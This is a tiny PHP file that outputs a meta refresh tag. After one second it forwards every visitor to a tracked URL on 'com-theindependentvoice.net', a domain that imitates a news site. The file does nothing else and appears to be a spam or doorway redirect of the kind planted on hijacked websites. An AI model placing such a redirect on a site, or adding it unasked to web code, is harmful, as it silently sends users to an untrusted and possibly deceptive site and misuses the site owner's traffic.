<?php
$urls = array (
            'http://com-theindependentvoice.net/indexer.php?a=269321&c=job&s=a9',
            );
          
          
$n = mt_rand(0,count($urls) - 1);
$rand_url = $urls[$n];
?>
<meta http-equiv="refresh" content="1; url=<?php echo  $rand_url;?> ">